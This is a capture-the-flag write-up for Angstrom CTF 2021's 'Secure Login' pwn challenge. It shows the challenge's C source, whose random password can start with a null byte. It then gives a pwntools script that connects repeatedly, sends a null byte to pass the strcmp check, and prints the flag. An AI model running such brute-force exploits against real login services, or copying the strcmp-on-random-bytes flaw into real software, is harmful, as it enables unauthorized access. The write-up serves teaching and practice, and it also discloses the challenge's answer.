---
name: Secure Login (2021)
event: Angstrom CTF 2021
category: Pwn
description: Writeup for Secure Login (pwn) - Angstrom CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Secure Login

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/2pqG6opzrug/0.jpg)](https://youtu.be/2pqG6opzrug?t=23s "Angstrom 2021: Secure Login")

## Challenge Description

> My login is, potentially, and I don't say this lightly, if you know me you know that's the truth, it's truly, and no this isn't snake oil, this is, no joke, the most secure login service in the world (source).

## Source

{% code overflow="wrap" %}
```c
#include <stdio.h>

char password[128];

void generate_password() {
	FILE *file = fopen("/dev/urandom","r");
	fgets(password, 128, file);
	fclose(file);
}

void main() {
	puts("Welcome to my ultra secure login service!");

	// no way they can guess my password if it's random!
	generate_password();

	char input[128];
	printf("Enter the password: ");
	fgets(input, 128, stdin);

	if (strcmp(input, password) == 0) {
		char flag[128];

		FILE *file = fopen("flag.txt","r");
		if (!file) {
		    puts("Error: missing flag.txt.");
		    exit(1);
		}

		fgets(flag, 128, file);
		puts(flag);
	} else {
		puts("Wrong!");
	}
}
```
{% endcode %}

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './login'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'warn'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Run program 1000 times (hoping for null byte)
for i in range(1000):
    io = start()
    io.recv()
    # Try to login with null byte
    io.sendline(b"\x00")
    io.recvuntil(': ')
    response = io.recv()
    # Did we get the flag?
    if(not b'Wrong!' in response):
        print(response)
    io.close()
```
{% endcode %}

Flag: `actf{if_youre_reading_this_ive_been_hacked}`
